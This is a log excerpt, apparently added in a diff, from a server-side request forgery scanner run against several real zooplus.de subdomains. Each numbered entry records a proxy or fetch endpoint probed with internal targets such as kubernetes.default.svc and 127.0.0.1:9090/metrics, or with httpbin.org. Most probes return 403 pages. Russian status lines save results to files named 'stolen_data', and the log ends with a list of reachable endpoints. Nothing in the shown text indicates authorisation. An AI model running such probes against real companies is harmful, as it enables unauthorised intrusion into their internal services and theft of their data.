+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_103.txt
+
+[104] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://httpbin.org/ip
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_104.txt
+
+[105] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_105.txt
+
+[106] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_106.txt
+
+[107] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_107.txt
+
+[108] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_108.txt
+
+[109] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_109.txt
+
+[110] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_110.txt
+
+[111] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_111.txt
+
+[112] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_112.txt
+
+[113] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_113.txt
+
+[114] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_114.txt
+
+[115] Subdomain: integration-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_115.txt
+
+[116] Subdomain: integration-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_116.txt
+
+[117] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_117.txt
+
+[118] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_118.txt
+
+[119] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_119.txt
+
+[120] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_120.txt
+
+[121] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_121.txt
+
+[122] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_122.txt
+
+[123] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_123.txt
+
+[124] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_124.txt
+
+[125] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_125.txt
+
+[126] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_126.txt
+
+[127] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_127.txt
+
+[128] Subdomain: integration-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_128.txt
+
+[129] Subdomain: integration-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_129.txt
+
+[130] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_130.txt
+
+[131] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_131.txt
+
+[132] Subdomain: release-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_132.txt
+
+[133] Subdomain: release-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_133.txt
+
+[134] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_134.txt
+
+[135] Subdomain: release-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_135.txt
+
+[136] Subdomain: release-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_136.txt
+
+[137] Subdomain: release-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_137.txt
+
+[138] Subdomain: release-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_138.txt
+
+[139] Subdomain: release-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_139.txt
+
+[140] Subdomain: release-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_140.txt
+
+[141] Subdomain: release-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_141.txt
+
+[142] Subdomain: release-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_142.txt
+
+[143] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_143.txt
+
+[144] Subdomain: release-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_144.txt
+
+[145] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_145.txt
+
+[146] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_146.txt
+
+[147] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_147.txt
+
+[148] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_148.txt
+
+[149] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_149.txt
+
+[150] Subdomain: release-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_150.txt
+
+[151] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_151.txt
+
+[152] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_152.txt
+
+[153] Subdomain: release-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_153.txt
+
+[154] Subdomain: release-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_154.txt
+
+[155] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_155.txt
+
+[156] Subdomain: integration-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_156.txt
+
+[157] Subdomain: release-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_157.txt
+
+[158] Subdomain: release-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_158.txt
+
+[*] Доступные endpoints (но с пустым телом): 56
+    - www.zooplus.de/zootopia-events/api/events/sites/1
+    - www.zooplus.de/zootopia-events/api/events/sites/1
+    - login.zooplus.de/api/proxy
+    - login.zooplus.de/zootopia-events/api/events/sites/1
+    - login.zooplus.de/zootopia-events/api/events/sites/1
+
+[+] Результаты сохранены: logs/subdomain_ssrf_results.json
